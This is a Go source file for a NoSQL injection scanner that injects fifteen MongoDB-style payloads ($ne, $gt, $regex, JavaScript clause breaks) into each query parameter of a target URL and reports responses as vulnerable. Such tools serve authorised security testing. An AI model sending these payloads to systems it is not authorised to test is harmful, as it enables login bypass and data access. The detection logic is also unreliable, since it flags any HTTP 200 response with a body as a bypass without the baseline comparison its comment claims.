package native

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

type NoSQLiResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestNoSQLi(baseURL string, params map[string]string) []NoSQLiResult {
	payloads := []string{
		`' || '1'=='1`,
		`' || 1==1 //`,
		`" || "1"=="1`,
		`' || '1'=='1' //`,
		`' || 1==1//`,
		`' && 1==2 //`,
		`{$gt: ''}`,
		`{$ne: ''}`,
		`{$regex: ".*"}`,
		`[$regex=.*]`,
		`' && this.credential == 'admin`,
		`';return true;var foo='`,
		`{"$gt": ""}`,
		`{"$ne": ""}`,
		`{"$regex": ".*"}`,
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []NoSQLiResult

	for param := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, v+payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body := ""
			if resp.StatusCode == 200 {
				buf := make([]byte, 2048)
				n, _ := resp.Body.Read(buf)
				body = string(buf[:n])
			}
			resp.Body.Close()

			// Check for MongoDB error messages
			if strings.Contains(body, "MongoError") || strings.Contains(body, "MongoDB") ||
				strings.Contains(body, "SyntaxError") || strings.Contains(body, "unexpected token") {
				results = append(results, NoSQLiResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("NoSQL error pattern in response with param %s", param),
				})
				continue
			}

			// Check for successful bypass (different response from baseline)
			if resp.StatusCode == 200 && body != "" {
				results = append(results, NoSQLiResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("HTTP 200 with payload on param %s (possible NoSQL bypass)", param),
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, NoSQLiResult{
			Endpoint: baseURL,
			Evidence: fmt.Sprintf("No NoSQL injection detected across %d payloads", len(payloads)),
		})
	}

	return results
}
